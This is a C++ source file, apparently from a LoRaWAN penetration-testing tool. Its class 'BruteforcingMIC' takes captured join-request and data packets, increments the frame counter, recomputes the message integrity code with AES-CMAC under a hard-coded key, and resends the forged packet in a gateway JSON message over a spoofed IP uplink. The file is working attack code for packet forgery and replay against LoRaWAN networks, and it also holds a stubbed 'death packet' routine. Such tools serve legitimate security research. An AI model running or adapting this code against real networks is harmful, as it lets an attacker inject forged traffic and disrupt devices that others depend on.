#include "bruteforcing_mic.h"

#include "Utils/common.h"
#include "Utils/jsonparser.h"

#include <iostream>
#include <chrono>
#include <thread>

BruteforcingMIC::BruteforcingMIC()
{


}

Lorawan_result BruteforcingMIC::sendGuardPacket( std::shared_ptr<DataPacket> dataPkt)
{
    std::string jsonToSend{};
    DataPacket copyPacket(dataPkt);

    unsigned long int ulCount = Common::bytes2ULong(copyPacket.getFrameCounter());

    ulCount +=1;

    copyPacket.setFrameCounter(Common::ulong2Bytes(ulCount));


    if(copyPacket.serialialize() != Lorawan_result::Success) //updated rawPacket
        return Lorawan_result::ErrorSerialize;


    if(calculateMIC(copyPacket) != Lorawan_result::Success)
    {
        return Lorawan_result::ErrorCalcMIC;
    }

    if(copyPacket.serialialize() != Lorawan_result::Success)
        return Lorawan_result::ErrorSerialize;


    if(createJsonToSend(copyPacket.getRawData(),copyPacket.getJsonString(),jsonToSend)
            != Lorawan_result::Success)
        return Lorawan_result::ErrorCreatingPacket;

    std::chrono::milliseconds timespan(5000);
    std::this_thread::sleep_for(timespan);

    Tins::IP refIP = dataPkt->getPacketIP();
    uplink.setIP(refIP);
    std::cout << "packet is based on IP with id = " << std::to_string(refIP.id()) << std::endl;
    std::cout << "sending guard packet with frame counter = " + std::to_string(Common::bytes2ULong(copyPacket.getFrameCounter())) << std::endl;

    if(send(copyPacket.getMagicFour(),testDevice->getEui64(), jsonToSend) != Lorawan_result::Success)
    {
        std:: cout << "error sending guard packet!" << std::endl;
    }

    return Lorawan_result::Success;
}

Lorawan_result BruteforcingMIC::calculateMIC(DataPacket &dataPkt)
{
    std::cout << "Calculating new MIC value" << std::endl;
    std::cout << "previous value of MIC: " << Common::bytes2HexStr(dataPkt.getMIC()) << std::endl;

    bytes initBlock{};
    bytes _localFCnt{};
    bytes _msg{};

    bytes calcCMAC{};
    bytes frameCounter = dataPkt.getFrameCounter();

    initBlock.emplace_back(0x49);

    for(int i=0; i < 4; i++)
        initBlock.emplace_back(0x00);

    initBlock.emplace_back(0x00); // DIR


    bytes littleEndianDevAddr{};
    if(Common::convertToLittleEndian(dataPkt.getDevAddr(),littleEndianDevAddr) != Lorawan_result::Success)
    {
        return Lorawan_result::ErrorConvert2LittleEndian;
    }

    initBlock.insert(initBlock.end(),littleEndianDevAddr.begin(), littleEndianDevAddr.end());

    if(frameCounter.empty())
    {
        std::cout << "Empty frame counter" << std::endl;
        return Lorawan_result::ErrorCalcMIC;
    }
    _localFCnt.emplace_back(0x00);
    _localFCnt.emplace_back(0x00);

    if(frameCounter.size() == 1)
    {
        _localFCnt.emplace_back(0x00);
        _localFCnt.emplace_back(frameCounter.front());
    }
    else
    {
        _localFCnt.insert(_localFCnt.begin(), frameCounter.begin(), frameCounter.end());
    }

    bytes littleEndianFCnt{};
    if(Common::convertToLittleEndian(_localFCnt,littleEndianFCnt) != Lorawan_result::Success)
    {
        return Lorawan_result::ErrorConvert2LittleEndian;
    }

    
    initBlock.insert(initBlock.end(), littleEndianFCnt.begin(), littleEndianFCnt.end());

    initBlock.emplace_back(0x00);



    bytes _rawPacket = dataPkt.getRawData();
    bytes::iterator nextByte = _rawPacket.begin();

    while(nextByte != _rawPacket.end() -4)
    {
       _msg.emplace_back(*nextByte);
       nextByte++;
    }

    if(_msg.empty())
        return Lorawan_result::ErrorCalcMIC;

    initBlock.emplace_back(static_cast<byte>(_msg.size()));

    bytes key = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00,0x00, 0x00,0x00, 0x00,
                 0x00, 0x00,0x02, 0x01};

    bytes message{};
    message.insert(message.begin(), initBlock.begin(), initBlock.end());
    message.insert(message.end(), _msg.begin(), _msg.end());

    if(Common::calculate_cmac(key,message, calcCMAC) != Lorawan_result::Success)
    {
        std::cout << "Error calculating CMAC" << std::endl;
        return Lorawan_result::ErrorCalcMIC;
    }

    dataPkt.setMIC(bytes(calcCMAC.begin(), calcCMAC.begin() + 4));

    std::cout << "Finished calculating MIC" << std::endl;
    return Lorawan_result::Success;
}

Lorawan_result BruteforcingMIC::sendDeathPacket()
{
    //calculateMIC();

    return Lorawan_result::Success;
}

Lorawan_result BruteforcingMIC::setUpSending(std::shared_ptr<JoinRequestPacket> requestPkt)
{
    testDevice->setAppEUI(requestPkt->getAppEUI());
    testDevice->setDevEUI(requestPkt->getDevEUI());
    testDevice->setEui64(requestPkt->getEui64());

    uplink.setDstPort(requestPkt->getDstPort());
    uplink.setSrcPort(requestPkt->getSrcPort());

    return Lorawan_result::Success;
}
Lorawan_result BruteforcingMIC::launch()
{
    PacketStorage *storage = PacketStorage::getInstance();

    std::vector<std::shared_ptr<JoinRequestPacket> > requests = storage->getRequestPacket();


    if(requests.size() > 0)
    {
        if(setUpSending(requests.front()) != Lorawan_result::Success)
        {
            return Lorawan_result::ErrorTestSetUp;
        }

        std::vector<std::shared_ptr<DataPacket> > macPayloads = storage->getMacPayloadPacket();

        if(macPayloads.size() > 0)
        {

            std::shared_ptr<DataPacket> firstPayload = macPayloads.at(0); // based on number

            if(sendGuardPacket(firstPayload) != Lorawan_result::Success)
            {
                return Lorawan_result::ErrorTestSetUp;
            }

            //            if(sendDeathPacket() != Lorawan_result::Success)
            //            {
            //                return Lorawan_result::ErrorTest;
            //            }


        } else
        {
            std::cout << "no payload packets" << std::endl;
            return Lorawan_result::ErrorTest;
        }

    }
    else
    {
        std::cout << "no requests packets" << std::endl;
        return Lorawan_result::ErrorTest;
    }


    return Lorawan_result::Success;
}

Lorawan_result
BruteforcingMIC::createJsonToSend(bytes rawPacket, std::string refJson, std::string &jsonToSend)
{
    JsonParser jParser;

    if(jParser.parse(refJson) != Lorawan_result::Success)
        return Lorawan_result::ErrorCreatingPacket;

    jsonToSend.clear();
    bytes encodedPacket{};

    if(Common::encodeBase64(rawPacket,encodedPacket) != Lorawan_result::Success)
        return Lorawan_result::ErrorCreatingPacket;

    if(encodedPacket.empty())
        return Lorawan_result::ErrorCreatingPacket;

    std::string changedValue = Common::bytes2Str(encodedPacket);

    if(jParser.changeValue(jsonKeys({"rxpk","data"}),changedValue) != Lorawan_result::Success)
        return Lorawan_result::ErrorCreatingPacket;

    jsonToSend = jParser.getJson();

    std::cout << "ref: " << refJson << std::endl;
    std::cout << "changed: " << jsonToSend << std::endl;


    return Lorawan_result::Success;

}

Lorawan_result BruteforcingMIC::send(bytes magicFour, bytes eui64, std::string json)
{
    bytes rawData;
    bytes rawJson = Common::str2Bytes(json);

    rawData.insert(rawData.begin(),magicFour.begin(), magicFour.end());
    rawData.insert(rawData.end(),eui64.begin(), eui64.end());
    rawData.insert(rawData.end(),rawJson.begin(), rawJson.end());

    std::string dataToSend = Common::bytes2Str(rawData);

    std::cout << "data to send: \n" << dataToSend << std::endl;

    return uplink.send(dataToSend);
}

Lorawan_result BruteforcingMIC::stop()
{
    return Lorawan_result::Success;
}


Lorawan_result BruteforcingMIC::printPackets()
{
    PacketStorage* storage = PacketStorage::getInstance();

    std::cout << std::endl;
    std::cout << "Able to perform bruteforcing attack with below packets:" << std::endl;

    std::vector<std::shared_ptr<JoinRequestPacket> > requestPackets = storage->getRequestPacket();
    std::vector<std::shared_ptr<JoinAcceptPacket> > acceptPackets = storage->getAcceptPacket();
    std::vector<std::shared_ptr<DataPacket> > dataPackets = storage->getMacPayloadPacket();

    std::cout << "Available packets:" << std::endl;
    std::cout << "Requests:" << std::to_string(requestPackets.size()) << std::endl;
    std::cout << "Accepts:" << std::to_string(acceptPackets.size()) << std::endl;
    std::cout << "Datas:" << std::to_string(dataPackets.size()) << std::endl;
    std::cout << std::endl;

    for(auto &request: requestPackets)
    {
        std::cout << "next request packet:" << std::endl;
        std::cout << Common::bytes2HexStr(request->getRawData()) << std::endl;
        std::cout << std::endl;
    }

    std::cout << std::endl;
    std::cout << std::endl;

    for(auto &accept: acceptPackets)
    {
        std::cout << "next accept packet:" << std::endl;
        std::cout << Common::bytes2HexStr(accept->getRawData()) << std::endl;
        std::cout << std::endl;
    }

    std::cout << std::endl;
    std::cout << std::endl;

    for(auto &data: dataPackets)
    {
        std::cout << "next data packet:" << std::endl;
        std::cout << Common::bytes2HexStr(data->getRawData()) << std::endl;
        std::cout << std::endl;
    }

    std::cout << std::endl;
    std::cout << std::endl;

    return Lorawan_result::Success;
}
